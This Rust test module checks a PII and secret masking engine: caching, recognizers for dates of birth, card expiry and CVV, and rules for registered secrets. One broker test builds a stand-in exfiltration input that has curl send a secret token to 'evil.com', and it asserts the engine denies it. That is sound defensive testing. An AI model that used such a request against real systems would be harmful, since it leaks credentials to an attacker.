    // A detection-affecting change (category off) moves `policy_fp` → fresh
    // detection, and the previously-masked EMAIL is no longer masked.
    #[test]
    fn category_change_invalidates_via_fingerprint() {
        let e = engine();
        let text = "mail dave@example.com";
        let on = e.mask(text, Surface::UserMessage).unwrap();
        assert!(on.masked_text.contains("[EMAIL_ADDRESS_"));
        assert_eq!(on.stats.fresh_miss, 1);
        assert_eq!(e.mask(text, Surface::UserMessage).unwrap().stats.hit, 1);

        let mut cfg = e.config_snapshot();
        cfg.enabled_categories.remove(&Category::Contact);
        e.set_config(cfg).unwrap();

        let off = e.mask(text, Surface::UserMessage).unwrap();
        assert_eq!(
            off.stats.fresh_miss, 1,
            "category change must bust the cache (fresh detection)"
        );
        assert_eq!(off.stats.hit, 0);
        assert!(
            off.masked_text.contains("dave@example.com"),
            "EMAIL no longer masked once Contact is off: {}",
            off.masked_text
        );
    }

    // LRU (not FIFO) eviction, and a live `cap = 0` that clears + disables.
    #[test]
    fn lru_evicts_least_recently_used_and_live_cap_zero_disables() {
        let cfg = EngineConfig {
            detection_cache_cap: 2,
            ..Default::default()
        };
        let e = MaskEngine::new(cfg).unwrap();
        let (t1, t2, t3) = (
            "one alice@example.com",
            "two bob@example.com",
            "three carol@example.com",
        );
        e.mask(t1, Surface::UserMessage).unwrap();
        e.mask(t2, Surface::UserMessage).unwrap();
        assert_eq!(e.cache.len(), 2);
        // Touch t1 → t2 becomes the least-recently-used.
        assert_eq!(e.mask(t1, Surface::UserMessage).unwrap().stats.hit, 1);
        // Insert t3 → evicts the LRU (t2), NOT t1 (which FIFO would have dropped).
        e.mask(t3, Surface::UserMessage).unwrap();
        assert_eq!(e.cache.len(), 2);
        assert_eq!(
            e.mask(t1, Surface::UserMessage).unwrap().stats.hit,
            1,
            "t1 stayed resident (recently used)"
        );
        assert_eq!(
            e.mask(t2, Surface::UserMessage).unwrap().stats.fresh_miss,
            1,
            "t2 was evicted as the LRU → miss"
        );

        // Live disable.
        let mut cfg0 = e.config_snapshot();
        cfg0.detection_cache_cap = 0;
        e.set_config(cfg0).unwrap();
        assert_eq!(e.cache.len(), 0, "cap 0 clears the cache");
        assert_eq!(
            e.mask(t1, Surface::UserMessage).unwrap().stats.fresh_miss,
            1,
            "disabled cache always misses"
        );
        assert_eq!(e.cache.len(), 0, "disabled cache never inserts");
    }

    // Two (here four) concurrent misses on the SAME new leaf run detection exactly
    // once — the ML gate's re-check gives single-flight (audit #6).
    #[test]
    fn concurrent_misses_single_flight_through_ml_gate() {
        use std::sync::atomic::{AtomicUsize, Ordering};
        use std::time::Duration;

        struct CountingPerson {
            calls: Arc<AtomicUsize>,
            entities: Vec<EntityType>,
        }
        impl Recognizer for CountingPerson {
            fn name(&self) -> &str {
                "counting-person"
            }
            fn supported_entities(&self) -> &[EntityType] {
                &self.entities
            }
            fn supported_languages(&self) -> &[&str] {
                &["en"]
            }
            fn analyze(
                &self,
                text: &str,
                _e: Option<&[EntityType]>,
                _n: Option<&NlpArtifacts>,
            ) -> Vec<RecognizerResult> {
                self.calls.fetch_add(1, Ordering::SeqCst);
                // Hold the gate long enough that all racers reach the first (gateless)
                // cache probe and miss before this insert lands.
                std::thread::sleep(Duration::from_millis(80));
                match text.find("Dana Scully") {
                    Some(pos) => vec![
                        RecognizerResult::new("PERSON".parse().unwrap(), pos, pos + 11, 0.99)
                            .with_recognizer("counting-person"),
                    ],
                    None => Vec::new(),
                }
            }
        }

        let e = Arc::new(engine_personal_on());
        let calls = Arc::new(AtomicUsize::new(0));
        let generation = e.ml_begin_load(MlConfig {
            enabled: true,
            ..Default::default()
        });
        e.ml_set_ready(
            generation,
            Arc::new(InfallibleMl(Arc::new(CountingPerson {
                calls: calls.clone(),
                entities: vec!["PERSON".parse().unwrap()],
            }))),
        );

        let text = "call Dana Scully";
        std::thread::scope(|s| {
            for _ in 0..4 {
                let e = e.clone();
                s.spawn(move || {
                    let out = e.mask(text, Surface::UserMessage).unwrap();
                    assert!(out.masked_text.contains("[PERSON_"));
                });
            }
        });
        assert_eq!(
            calls.load(Ordering::SeqCst),
            1,
            "single-flight: 4 concurrent identical misses run detection once"
        );
    }

    // Detection is deterministic and carries a stable per-source tag (the field the
    // deferred Component-3 burn keys off; also exercises the literal marker).
    #[test]
    fn detection_is_deterministic_and_source_tagged() {
        use crate::cache::Source;
        let analyzer = presidio_analyzer::default_analyzer("en");
        let cfg = EngineConfig::default();
        let customs = detect::compile_customs(&cfg.custom_replacements).unwrap();
        let text = "ping bob@example.com";
        let a =
            run_detection(&analyzer, &cfg, &customs, &[], None, text, Surface::UserMessage).unwrap();
        let b =
            run_detection(&analyzer, &cfg, &customs, &[], None, text, Surface::UserMessage).unwrap();
        assert_eq!(a.len(), 1, "one EMAIL detection");
        assert_eq!(a.len(), b.len());
        assert_eq!(a[0].start, b[0].start);
        assert_eq!(a[0].end, b[0].end);
        assert_eq!(a[0].entity_type, b[0].entity_type);
        assert_eq!(
            a[0].source,
            Source::Regex,
            "presidio email is regex-sourced"
        );
        assert!(!a[0].literal);
    }

    // ----- zlauder-local hard-context recognizers (DOB / expiry / CVV) ----------
    //
    // These prove the recognizers are REGISTERED in `from_parts` and run in Pass 2 →
    // `ingest_results` (the Custom entities the category gate now enables), end-to-end
    // through a real `MaskEngine` under the default Balanced profile.

    // CVV defaults to the irreversible Redact (PCI SAD), so it masks to `[REDACTED]`
    // and leaves no reversible manifest entry; DOB/expiry tokenize.
    #[test]
    fn cvv_plan_recall_corpus_masks_end_to_end() {
        let e = engine(); // Balanced: Identity + Financial on

        // DOB → tokenized (reversible), value-only span (label "DOB:" survives).
        let dob = e.mask("DOB: 1990-01-02", Surface::UserMessage).unwrap();
        assert!(
            dob.masked_text.starts_with("DOB: ") && dob.masked_text.contains("[DATE_OF_BIRTH_"),
            "DOB value-only token: {}",
            dob.masked_text
        );
        assert!(!dob.masked_text.contains("1990-01-02"));
        assert_eq!(
            e.unmask(&dob.masked_text, &dob.manifest).unwrap(),
            "DOB: 1990-01-02",
            "DOB round-trips"
        );

        // DOB year-first full-capture regression (audit V2): the FULL date is captured
        // (the longest-first day reorder fixes the `2023-11-15` → `2023-11-1`
        // truncation). The authoritative proof is the round-trip to the full original
        // AND that no truncated remnant ("-15" / a stray "5") is left beside the token.
        let dob2 = e.mask("DOB: 2023-11-15", Surface::UserMessage).unwrap();
        assert!(!dob2.masked_text.contains("2023-11-15"));
        assert!(
            dob2.masked_text.starts_with("DOB: ")
                && dob2.masked_text.contains("[DATE_OF_BIRTH_")
                && !dob2.masked_text.contains("-1")
                && !dob2.masked_text.ends_with('5'),
            "full date masked, no truncated remnant: {}",
            dob2.masked_text
        );
        assert_eq!(
            e.unmask(&dob2.masked_text, &dob2.manifest).unwrap(),
            "DOB: 2023-11-15",
            "full-date round-trips (no truncated trailing digit)"
        );

        // Card expiry with card context → tokenized, value-only span.
        let exp = e
            .mask("card 4111111111111111 exp 03/27", Surface::UserMessage)
            .unwrap();
        assert!(
            exp.masked_text.contains("[CREDIT_CARD_EXPIRATION_"),
            "expiry masked with card context: {}",
            exp.masked_text
        );
        assert!(!exp.masked_text.contains("03/27"));

        // CVV → Redact-by-default (PCI SAD), value-only (label "CVV:" survives), no
        // reversible manifest entry for the redacted value.
        let cvv = e.mask("CVV: 123", Surface::UserMessage).unwrap();
        assert_eq!(cvv.masked_text, "CVV: [REDACTED]", "CVV redacted, value-only");
        assert!(
            !cvv.manifest.entries.iter().any(|m| m.canonical_form == "123"),
            "redacted CVV leaves no reversible manifest entry"
        );
    }

    // FP-safety: the card-context gate kills the ubiquitous-log expiry FP, and bare
    // cid/csc never mask — end-to-end, 0 masks.
    #[test]
    fn cvv_plan_fp_corpus_zero_masks_end_to_end() {
        let e = engine();
        for text in [
            "the cache expires 12/24",
            "certificate expires Jan 2026",
            "export 03/27",
            "cid=4096",
            r#"{"csc": 200}"#,
        ] {
            let out = e.mask(text, Surface::UserMessage).unwrap();
            assert_eq!(
                out.masked_text, text,
                "FP-safety: {text:?} must pass through unmasked, got {:?}",
                out.masked_text
            );
        }
    }

    // C6 combined-overlap regression: DOB + CREDIT_CARD + CREDIT_CARD_EXPIRATION + CVV
    // all survive zlauder's type-guard-less `resolve_overlaps` (value-only spans do not
    // collide with the PAN span). All four entity kinds must appear.
    #[test]
    fn cvv_plan_combined_overlap_all_four_survive() {
        let e = engine();
        let text = "DOB: 1990-01-02, card 4111111111111111 exp 03/27 cvv 123";
        let out = e.mask(text, Surface::UserMessage).unwrap();
        let m = &out.masked_text;
        assert!(m.contains("[DATE_OF_BIRTH_"), "DOB survived: {m}");
        assert!(
            m.contains("[CREDIT_CARD_EXPIRATION_"),
            "expiry survived: {m}"
        );
        // CREDIT_CARD (the PAN) masks to its last 4 via the compiled built-in (irreversible
        // Mask), distinct from the still-tokenized `[CREDIT_CARD_EXPIRATION_...]` expiry.
        assert!(
            m.contains("************1111"),
            "CREDIT_CARD (PAN) masked last-4 by the built-in: {m}"
        );
        assert!(m.contains("[REDACTED]"), "CVV (redacted) survived: {m}");
        // None of the raw values leak.
        for raw in ["1990-01-02", "4111111111111111", "03/27"] {
            assert!(!m.contains(raw), "{raw} leaked: {m}");
        }
    }

    // ---- prewarm_batch parity (Phase A: engine batched-detection primitive) ----

    /// A deterministic stand-in for the ML recognizer: flags every occurrence of a
    /// fixed `marker` as an `EmailAddress` (whose default operator is `Token`, so it
    /// is reversible) — letting the prewarm path be exercised WITHOUT loading the
    /// ~2.8 GB model. The marker is a shape the regex analyzer never detects, so on
    /// it the ONLY detection is this mock's, isolating the ML batch path.
    ///
    /// `analyze_batch` is left at the trait default (loops `analyze`) — which is
    /// exactly what `mask`'s per-leaf path calls — so this pins the PLUMBING: key
    /// derivation, dedupe, cache insert/hit, and `run_detection_batch` ≡ per-leaf
    /// `run_detection`. The real-model recall parity (batched forward ≡ looped
    /// forward) is gated separately by the ignored `prewarm_parity` integration test.
    #[derive(Debug)]
    struct MarkerRecognizer {
        entities: Vec<presidio_core::EntityType>,
        marker: &'static str,
    }

    impl MarkerRecognizer {
        fn new(marker: &'static str) -> Self {
            Self {
                entities: vec![presidio_core::EntityType::EmailAddress],
                marker,
            }
        }
    }

    impl presidio_core::Recognizer for MarkerRecognizer {
        fn name(&self) -> &str {
            "marker-mock"
        }
        fn supported_entities(&self) -> &[presidio_core::EntityType] {
            &self.entities
        }
        fn supported_languages(&self) -> &[&str] {
            &["en"]
        }
        fn analyze(
            &self,
            text: &str,
            _entities: Option<&[presidio_core::EntityType]>,
            _nlp: Option<&presidio_core::NlpArtifacts>,
        ) -> Vec<presidio_core::RecognizerResult> {
            let mut out = Vec::new();
            let mut from = 0;
            while let Some(i) = text[from..].find(self.marker) {
                let start = from + i;
                let end = start + self.marker.len();
                out.push(presidio_core::RecognizerResult::new(
                    presidio_core::EntityType::EmailAddress,
                    start,
                    end,
                    0.99,
                ));
                from = end;
            }
            out
        }
    }

    /// An engine with the mock ML recognizer `Ready`. Fixed session bytes ⇒
    /// deterministic token minting, so two engines' masked outputs (which embed
    /// minted tokens) are byte-comparable.
    fn engine_with_mock_ml(marker: &'static str) -> MaskEngine {
        let e = MaskEngine::with_session(EngineConfig::default(), [7u8; 32], [9u8; 16]).unwrap();
        let generation = e.ml_begin_load(MlConfig::default());
        e.ml_set_ready(
            generation,
            Arc::new(InfallibleMl(Arc::new(MarkerRecognizer::new(marker)))),
        );
        assert!(e.ml_active(), "mock ML should be Ready");
        e
    }

    /// The load-bearing engine-side contract: prewarming the whole request then
    /// masking per-leaf yields byte-IDENTICAL output to masking each leaf straight,
    /// across duplicates, a no-detection leaf, multiple surfaces, and a user-bypass
    /// leaf (which prewarm must skip). And prewarm is effective: the non-bypass
    /// leaves come back as cache HITS with zero per-leaf inference.
    #[test]
    fn prewarm_then_mask_matches_unprewarmed() {
        let marker = "ZZMARK";
        let leaves: Vec<(&str, Surface)> = vec![
            ("contact ZZMARK now", Surface::UserMessage),
            ("nothing to see here", Surface::ToolResult),
            ("two ZZMARK and ZZMARK again", Surface::SystemPrompt),
            ("contact ZZMARK now", Surface::UserMessage), // duplicate ⇒ dedupe path
            ("user said >>ZZMARK<< verbatim", Surface::UserMessage), // bypass ⇒ skipped
        ];

        // Path A: no prewarm — straight per-leaf mask (the proven reference).
        let a = engine_with_mock_ml(marker);
        let out_a: Vec<String> = leaves
            .iter()
            .map(|(t, s)| a.mask(t, *s).unwrap().masked_text)
            .collect();

        // Path B: prewarm the whole request, then per-leaf mask.
        let b = engine_with_mock_ml(marker);
        b.prewarm_batch(&leaves);
        let outcomes_b: Vec<MaskOutcome> =
            leaves.iter().map(|(t, s)| b.mask(t, *s).unwrap()).collect();
        let out_b: Vec<String> = outcomes_b.iter().map(|o| o.masked_text.clone()).collect();

        // Correctness contract: prewarm NEVER changes the masked output.
        assert_eq!(out_a, out_b, "prewarm altered masked output");

        // The mock masks the marker as an email token.
        assert!(
            out_b[0].contains("[EMAIL_ADDRESS_"),
            "marker should be masked: {}",
            out_b[0]
        );
        // Bypass span passes through verbatim (prewarm correctly skipped this leaf).
        assert!(
            out_b[4].contains("ZZMARK"),
            "bypass span should pass through: {}",
            out_b[4]
        );

        // Effectiveness: every non-bypass leaf (incl. the no-marker leaf 1, whose
        // empty detection list is still cached by prewarm) is a HIT with no re-run.
        for i in [0usize, 1, 2, 3] {
            assert_eq!(
                outcomes_b[i].stats.ml_ran, 0,
                "leaf {i} must not re-run ML after prewarm: {:?}",
                outcomes_b[i].stats
            );
            assert_eq!(
                outcomes_b[i].stats.hit, 1,
                "leaf {i} must be a prewarm cache hit: {:?}",
                outcomes_b[i].stats
            );
        }
    }

    /// With no ML recognizer active, prewarm is a no-op: it must not panic and must
    /// not pre-populate the (no-ML key space) cache — the per-leaf regex path runs
    /// fresh exactly as before.
    #[test]
    fn prewarm_without_ml_is_noop_and_safe() {
        let e = MaskEngine::new(EngineConfig::default()).unwrap();
        let leaves = vec![("contact alice@example.com please", Surface::UserMessage)];
        e.prewarm_batch(&leaves); // must be a safe no-op
        let out = e.mask(leaves[0].0, leaves[0].1).unwrap();
        assert!(out.masked_text.contains("[EMAIL_ADDRESS_"));
        assert_eq!(out.stats.hit, 0, "no-ML prewarm must not pre-populate");
        assert_eq!(out.stats.fresh_miss, 1);
    }

    /// Prewarm honors the master switch (disabled ⇒ no-op) and tolerates empty input.
    #[test]
    fn prewarm_respects_master_switch_and_empty_input() {
        let e = engine_with_mock_ml("ZZMARK");
        e.set_enabled(false);
        e.prewarm_batch(&[("ZZMARK", Surface::UserMessage)]); // master off ⇒ no-op
        e.prewarm_batch(&[]); // empty ⇒ no-op
        e.set_enabled(true);
        // Re-enabled: mask runs fresh (prewarm cached nothing while disabled) and still
        // masks the marker.
        let out = e.mask("ZZMARK", Surface::UserMessage).unwrap();
        assert!(out.masked_text.contains("[EMAIL_ADDRESS_"));
    }

    // ----- Registered secrets (Pass-0) -----------------------------------------

    fn secret_rule(name: &str, value: &str, op: Operator) -> SecretRule {
        SecretRule {
            name: name.into(),
            value: SecretValue::new(value),
            operator: op,
            case_sensitive: true,
            apply_to_surfaces: None,
        }
    }

    // `hash` (ex-"guard"): salted colon-form, never interned, unmask is a no-op.
    #[test]
    fn hash_secret_masks_and_is_never_revealable() {
        let e = engine();
        e.set_secret_rules(vec![secret_rule("db_pw", "S3cretPlaintext!", Operator::Hash)])
            .unwrap();
        let out = e
            .mask("connect with S3cretPlaintext! now", Surface::UserMessage)
            .unwrap();
        assert!(
            !out.masked_text.contains("S3cretPlaintext!"),
            "value leaked: {}",
            out.masked_text
        );
        assert!(
            out.masked_text.contains("[DB_PW:"),
            "salted colon-form hash render: {}",
            out.masked_text
        );
        assert!(out.manifest.is_empty(), "hash mints no reversible entry");
        // Colon-form is outside `token_regex` ⇒ unmask is a no-op.
        let back = e.unmask(&out.masked_text, &out.manifest).unwrap();
        assert_eq!(back, out.masked_text, "unmask is a no-op on a hash token");
    }

    #[test]
    fn redact_secret_collapses() {
        let e = engine();
        e.set_secret_rules(vec![secret_rule("pin", "1234", Operator::Redact)])
            .unwrap();
        let out = e.mask("pin is 1234 ok", Surface::UserMessage).unwrap();
        assert!(out.masked_text.contains("[REDACTED]"));
        assert!(!out.masked_text.contains("1234"));
    }

    // `broker`: minted as `[BROKER__NAME_hex]`; the display unmask REFUSES it.
    #[test]
    fn broker_secret_minted_and_display_refused() {
        let e = engine();
        e.set_secret_rules(vec![secret_rule("api_key", "sk-LIVE-9999", Operator::Broker)])
            .unwrap();
        let out = e.mask("use sk-LIVE-9999 here", Surface::UserMessage).unwrap();
        assert!(
            !out.masked_text.contains("sk-LIVE-9999"),
            "broker value leaked: {}",
            out.masked_text
        );
        assert!(
            out.masked_text.contains("[BROKER__API_KEY_"),
            "broker token: {}",
            out.masked_text
        );
        // Display path must NOT resolve a broker token, even WITH the manifest.
        let shown = e.unmask(&out.masked_text, &out.manifest).unwrap();
        assert!(
            !shown.contains("sk-LIVE-9999"),
            "display unmask leaked broker value: {shown}"
        );
        assert!(
            shown.contains("[BROKER__API_KEY_"),
            "broker token must be refused verbatim on display"
        );
        // ...also via the assistant (marker-capable) display path.
        let shown2 = e.unmask_assistant(&out.masked_text, &out.manifest).unwrap();
        assert!(!shown2.contains("sk-LIVE-9999"));
    }

    // `local` (owner-reveal): minted as a standard `[ENTITY_hex]` token (NOT broker-
    // prefixed); REVEALED on the display path so the user gets the value, but REFUSED into
    // tool inputs until the handle is promoted for the session.
    #[test]
    fn local_secret_reveals_on_display_denies_tool_until_promoted() {
        let e = engine();
        e.set_secret_rules(vec![secret_rule("zlauder_admin_key", "AdminKeyValue123", Operator::Local)])
            .unwrap();
        let out = e
            .mask("open AdminKeyValue123 now", Surface::UserMessage)
            .unwrap();
        assert!(!out.masked_text.contains("AdminKeyValue123"), "value leaked: {}", out.masked_text);
        assert!(
            out.masked_text.contains("[ZLAUDER_ADMIN_KEY_"),
            "expected standard Local token, got {}",
            out.masked_text
        );
        assert!(!out.masked_text.contains("[BROKER__"), "Local must not be broker-prefixed");

        let token = out.manifest.entries[0].token_handle.clone();

        // DISPLAY (Arrow 2): revealed.
        assert!(
            e.unmask_assistant(&out.masked_text, &out.manifest).unwrap().contains("AdminKeyValue123"),
            "Local must reveal on the display path"
        );
        // TOOL INPUT (Arrow 3): refused — left as the token (this is the real deny gate,
        // exercised directly on `unmask`, the function tool-input strings route through).
        let tool = e.unmask(&out.masked_text, &out.manifest).unwrap();
        assert!(!tool.contains("AdminKeyValue123"), "Local must NOT reveal into a tool input: {tool}");
        assert!(tool.contains("[ZLAUDER_ADMIN_KEY_"));

        // PROMOTE the handle for the session → now the tool path resolves it too.
        e.promote_token(&token);
        assert!(
            e.unmask(&out.masked_text, &out.manifest).unwrap().contains("AdminKeyValue123"),
            "a promoted Local token must resolve on the tool-input path"
        );
        // Display still reveals (unaffected by promote).
        assert!(e.unmask_assistant(&out.masked_text, &out.manifest).unwrap().contains("AdminKeyValue123"));
    }

    // Cross-turn: a Local token echoed in a LATER turn (no manifest entry this turn) is
    // still display-revealed / tool-denied via the store kind, using an EMPTY manifest.
    #[test]
    fn local_token_cross_turn_via_store_kind() {
        let e = engine();
        e.set_secret_rules(vec![secret_rule("zlauder_admin_key", "AdminKeyValue123", Operator::Local)])
            .unwrap();
        let minted = e.mask("AdminKeyValue123", Surface::UserMessage).unwrap();
        let token = minted.manifest.entries[0].token_handle.clone();
        let line = format!("see {token} there");
        let empty = UnmaskManifest::new();
        // Display: revealed cross-turn (store kind = Local).
        assert!(e.unmask_assistant(&line, &empty).unwrap().contains("AdminKeyValue123"));
        // Tool: refused cross-turn.
        assert!(!e.unmask(&line, &empty).unwrap().contains("AdminKeyValue123"));
        assert!(e.unmask(&line, &empty).unwrap().contains(&token));
    }

    // Regression (monitor capture seed): a `Local` secret is interned at `set_secret_rules`
    // time, so `local_redaction_pairs()` returns its (value → handle) pair BEFORE any mask()
    // call. Without the eager intern the pair appears only after the first admin-key masking
    // turn, so the monitor's capture-scrub seed would be empty and a cross-turn reveal in the
    // gap could persist the admin key unmasked. The install handle must equal the masked one.
    #[test]
    fn local_redaction_pairs_seeded_at_install_not_lazily() {
        let e = engine();
        e.set_secret_rules(vec![secret_rule(
            "zlauder_admin_key",
            "AdminKeyValue123",
            Operator::Local,
        )])
        .unwrap();
        // BEFORE any mask() call the pair is already present.
        let pairs = e.local_redaction_pairs();
        assert_eq!(pairs.len(), 1, "the Local secret must be interned at install");
        assert_eq!(pairs[0].0, "AdminKeyValue123");
        assert!(pairs[0].1.starts_with("[ZLAUDER_ADMIN_KEY_"), "got {}", pairs[0].1);
        // The install-seeded handle must equal the one a real mask() mints (same name).
        let out = e.mask("AdminKeyValue123", Surface::UserMessage).unwrap();
        assert_eq!(
            pairs[0].1, out.manifest.entries[0].token_handle,
            "install-seeded handle must match the masked handle"
        );
    }

    // `Operator::Local` is internal-only: it can't be set via serialized config (serde
    // skip) nor via `default_operator`/`entity_operators` (rejected in `Policy::new`).
    #[test]
    fn local_operator_is_not_user_settable() {
        assert!(
            serde_json::from_str::<Operator>(r#"{"kind":"local"}"#).is_err(),
            "Operator::Local must not be deserializable from config"
        );
        let cfg = EngineConfig {
            default_operator: Operator::Local,
            ..Default::default()
        };
        assert!(
            MaskEngine::new(cfg).is_err(),
            "Local as default_operator must be rejected"
        );
        let mut cfg2 = EngineConfig::default();
        cfg2.entity_operators.insert("EMAIL_ADDRESS".into(), Operator::Local);
        assert!(
            MaskEngine::new(cfg2).is_err(),
            "Local in entity_operators must be rejected"
        );
    }

    // A9: a registered secret that also matches the allow-list is STILL masked.
    #[test]
    fn secret_is_exempt_from_allow_list() {
        let mut cfg = EngineConfig::default();
        cfg.allow_list.add_exact("OPENSESAME");
        let e = MaskEngine::new(cfg).unwrap();
        e.set_secret_rules(vec![secret_rule("magic", "OPENSESAME", Operator::Hash)])
            .unwrap();
        let out = e.mask("say OPENSESAME please", Surface::UserMessage).unwrap();
        assert!(
            !out.masked_text.contains("OPENSESAME"),
            "allow-list must not suppress a registered secret: {}",
            out.masked_text
        );
    }

    // A9: a registered secret is masked even when the engine/surface is disabled.
    #[test]
    fn secret_masked_even_when_engine_disabled() {
        let e = engine();
        e.set_secret_rules(vec![secret_rule("tok", "TOPSECRETVALUE", Operator::Hash)])
            .unwrap();
        e.set_enabled(false);
        let out = e
            .mask("here TOPSECRETVALUE there", Surface::UserMessage)
            .unwrap();
        assert!(
            !out.masked_text.contains("TOPSECRETVALUE"),
            "secret must mask even when the engine is disabled: {}",
            out.masked_text
        );
        // A non-secret on a disabled engine still passes through.
        let pii = e.mask("email a@b.com", Surface::UserMessage).unwrap();
        assert!(
            pii.masked_text.contains("a@b.com"),
            "non-secret passes through when disabled"
        );
    }

    // A9: a registered secret inside a `>>…<<` bypass is masked, not leaked.
    #[test]
    fn secret_masked_inside_user_bypass() {
        let e = engine();
        e.set_secret_rules(vec![secret_rule("tok", "LEAKME123", Operator::Hash)])
            .unwrap();
        let out = e
            .mask("send >>LEAKME123 and hi<<", Surface::UserMessage)
            .unwrap();
        assert!(
            !out.masked_text.contains("LEAKME123"),
            "bypass must not leak a known secret: {}",
            out.masked_text
        );
        assert!(
            out.masked_text.contains("and hi"),
            "non-secret bypass text stays verbatim: {}",
            out.masked_text
        );
    }

    #[test]
    fn config_snapshot_omits_secret_values() {
        let e = engine();
        e.set_secret_rules(vec![secret_rule("db", "ULTRASECRET", Operator::Broker)])
            .unwrap();
        let json = serde_json::to_string(&e.config_snapshot()).unwrap();
        assert!(
            !json.contains("ULTRASECRET"),
            "a secret value must never serialize into EngineConfig"
        );
        assert_eq!(e.secret_count(), 1);
    }

    // F2 (ship-gate): overlapping registered secrets must be overlap-resolved on the
    // secrets-only fast path (disabled surface), never splicing overlapping ranges.
    #[test]
    fn overlapping_secrets_resolve_on_fast_path() {
        let e = engine();
        e.set_secret_rules(vec![
            secret_rule("longval", "SUPERSECRETVALUE", Operator::Hash),
            secret_rule("shortval", "SECRET", Operator::Redact), // substring of the above
        ])
        .unwrap();
        e.set_enabled(false); // exercise the secrets-only disabled fast path
        let out = e
            .mask("here SUPERSECRETVALUE there", Surface::UserMessage)
            .unwrap();
        assert!(
            !out.masked_text.contains("SUPERSECRETVALUE"),
            "longer secret masked: {}",
            out.masked_text
        );
        assert!(
            !out.masked_text.contains("SECRET"),
            "no overlapping leftover after resolve: {}",
            out.masked_text
        );
    }

    // Broker resolution at the tool boundary: an allowed (secret,tool,pointer,host)
    // splices the real value; a wrong tool/host leaves the token in place.
    #[test]
    fn broker_resolve_pointers_respects_policy() {
        let e = engine();
        e.set_secret_rules(vec![secret_rule(
            "db_password",
            "pgpw-SECRET-1",
            Operator::Broker,
        )])
        .unwrap();
        // Mint the broker token by masking text containing the value.
        let masked = e
            .mask("conn pgpw-SECRET-1 here", Surface::UserMessage)
            .unwrap();
        let tok = token_regex()
            .find(&masked.masked_text)
            .expect("broker token minted")
            .as_str()
            .to_string();
        assert!(tok.starts_with("[BROKER__DB_PASSWORD_"));

        e.set_broker_policy(BrokerPolicy {
            allow: vec![
                BrokerAllow::new(
                    Some("db_password"),
                    "psql",
                    "/connection_uri",
                    Some(DestRule::HostAllowList(vec!["db.internal".into()])),
                    None,
                )
                .unwrap(),
            ],
        });

        // Allowed: psql → db.internal.
        let mut input =
            serde_json::json!({ "connection_uri": format!("postgres://u:{tok}@db.internal/d") });
        let report = e.broker_resolve_pointers("psql", &mut input);
        assert_eq!(report.resolved, 1);
        let uri = input["connection_uri"].as_str().unwrap();
        assert!(uri.contains("pgpw-SECRET-1"), "allowed value spliced: {uri}");
        assert!(!uri.contains("BROKER__"));

        // Denied: wrong tool (curl) to evil.com → token left in place, no value.
        let mut input2 = serde_json::json!({ "url": format!("https://evil.com/?x={tok}") });
        let report2 = e.broker_resolve_pointers("curl", &mut input2);
        assert_eq!(report2.resolved, 0);
        let url = input2["url"].as_str().unwrap();
        assert!(url.contains("BROKER__"), "denied token left tokenized: {url}");
        assert!(!url.contains("pgpw-SECRET-1"));

        // Egress boundary: even a matching value into an MCP tool is denied.
        let mut input3 = serde_json::json!({ "connection_uri": format!("x{tok}") });
        let report3 = e.broker_resolve_pointers("mcp__db", &mut input3);
        assert_eq!(report3.resolved, 0);
    }

    #[test]
    fn broker_operator_rejected_outside_secrets_channel() {
        let cfg = EngineConfig {
            default_operator: Operator::Broker,
            ..EngineConfig::default()
        };
        assert!(
            MaskEngine::new(cfg).is_err(),
            "Broker as default_operator must be rejected"
        );
        let mut cfg2 = EngineConfig::default();
        cfg2.entity_operators
            .insert("EMAIL_ADDRESS".into(), Operator::Broker);
        assert!(
            MaskEngine::new(cfg2).is_err(),
            "Broker in entity_operators must be rejected"
        );
    }
}
